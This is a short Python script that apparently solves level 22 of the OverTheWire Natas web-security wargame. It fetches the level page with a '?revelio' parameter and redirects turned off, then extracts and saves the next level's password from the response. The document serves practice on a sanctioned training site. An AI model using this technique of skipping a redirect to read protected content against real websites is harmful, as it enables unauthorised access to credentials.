import requests
import re
from natas_utility import *
import html

current_level = 22
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url + '?revelio'

headers = {'location': '/?revelio'}

session = requests.session()

response = session.get(url, auth=auth, headers=headers, allow_redirects=False)

content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n')

password_regex = re.compile(r'Password: (.+)</pre>')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
